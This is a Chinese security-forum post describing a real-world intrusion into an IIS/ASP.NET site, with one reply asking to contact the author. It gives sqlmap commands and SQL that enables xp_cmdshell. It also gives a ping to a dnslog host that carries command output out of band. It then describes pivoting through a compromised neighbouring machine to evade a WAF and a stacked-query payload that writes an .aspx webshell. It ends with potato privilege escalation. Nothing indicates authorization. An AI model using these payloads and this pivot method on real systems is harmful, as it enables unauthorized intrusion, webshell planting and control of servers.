---
title: 实战渗透之曲线救国
url: https://forum.90sec.com/t/topic/2204
source: 90Sec - 最新话题
date: 2022-12-23
fetch_date: 2025-10-04T02:18:10.530224
---

# 实战渗透之曲线救国

[90Sec](/)

# [实战渗透之曲线救国](/t/topic/2204)

[技术文章](/c/article/6)

[1433525240](https://forum.90sec.com/u/1433525240)

2022 年12 月 22 日 10:53

1

记录一次实战稍曲折拿下目标站点的过程。

### 前期摸点

`IIS7.0`+`ASP.NET`的组合，简单尝试发现前台登录页面可能存在SQL注入，数据包如下：

[![sqli-burp](https://forum.90sec.com/uploads/default/optimized/2X/6/607399b0ac10bdbdd89f83fa090c4c7929566774_2_690x257.png)

sqli-burp1372×512 141 KB](https://forum.90sec.com/uploads/default/original/2X/6/607399b0ac10bdbdd89f83fa090c4c7929566774.png "sqli-burp")

为了节约时间直接祭出sqlmap，`-r x.txt -v 3 --random-agent --dbms=mssql --batch`

[![sqlmap1](https://forum.90sec.com/uploads/default/original/2X/7/73830b120da0f887e85102332c08b4e5cf4aaad0.png)

sqlmap11357×733 69 KB](https://forum.90sec.com/uploads/default/original/2X/7/73830b120da0f887e85102332c08b4e5cf4aaad0.png "sqlmap1")

识别出了数据库，却被不明力量拦截了。

手工尝试绕过不明力量，堆叠的方式利用xp\_cmdshell尝试将命令回显从dnslog中带出来：

> 先开xp\_cmdshell：`EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE`

> 利用dnslog带出回显：`EXEC master..xp_cmdshell 'ping xxx.dnslog.cn -n 2'`

一顿操作过后发现dnslog没反应，这里可能有几个原因，第一就是被不明力量拦截了，第二是目标不出网，第三可能我们语句构造有问题。是第一个原因的可能性比较大。

### 曲线救国

放弃注入后，还测试了其他漏洞，都以失败告终。但是目标是一个单位的子域而已，可以从单位的其他站点入手，进入内网后再尝试MS17010、pth等等手段来拿到目标机器权限即可。

于是在历经九九八十一难后，我们终于在目标所属B段中拿到一台机器权限，并使用代理成功进入内网。

遗憾的是拿到的机器是linux服务器，并且内网MS17010都已经打了补丁，fscan扫出来的结果基本无用。如果我们继续拿内网机器权限再利用hash传递攻击尝试的话，且不说密码是否通杀，就时间上也会浪费不少，于是陷入了小小的尴尬境地。

不过我们随即转念一想，大多数的不明力量都会部署在dmz或者在最外层交换机之上，而目前我们在内网中是不是不会受到不明力量影响？思路到此立即掏出sqlmap，再次`-r x.txt -v 3 --random-agent --dbms=mssql --batch`

![sqlmap2](https://forum.90sec.com/uploads/default/original/2X/3/39b7024c2a3d2fdbbf5fb87fe454d037322cc1ed.png)

果然如我们所想，成功注出来了，先看一下权限：

![sqlmap3](https://forum.90sec.com/uploads/default/original/2X/7/779b3b5c4f3ff72a965573ff8434e7c18a05d902.png)

dba权限，直接os-shell，采用的是堆叠+延时的注入，一个whoami等了将近10分钟的时间，太慢了，还是手注吧。

从whoami的回显得知系统权限为低权限，加用户肯定是行不通了，站库没有分离，直接写个webshell。路径的话在报错的数据包就可以找到，值得注意的是，这里权限是普通用户权限，所以写webshell最好选择上传的目录或图片路径，本人尝试写入根路径浪费了一些时间。

上语句：
`%';EXEC xp_cmdshell 'echo "xxx" > D:\xxx\xxx\xxx.aspx' -- -`

[![shell](https://forum.90sec.com/uploads/default/optimized/2X/e/ec31686f05e8d21089ca80af1d2ad4e2e110f2fc_2_690x278.png)

shell1367×551 154 KB](https://forum.90sec.com/uploads/default/original/2X/e/ec31686f05e8d21089ca80af1d2ad4e2e110f2fc.png "shell")

成功getshell，最后用土豆提权收个尾，战斗结束。

![system](https://forum.90sec.com/uploads/default/original/2X/c/cdc964631dbdd41c307da7b045eb8df6bceb2015.png)

1 个赞

[Eeson](https://forum.90sec.com/u/Eeson)

2025 年1 月 14 日 10:53

2

大哥，有事相求 怎么取得联系

* [首页](/)
* [类别](/categories)
* [准则](/guidelines)
* [服务条款](/tos)
* [隐私政策](/privacy)

由 [Discourse](https://www.discourse.org) 提供技术支持，启用 JavaScript 以获得最佳体验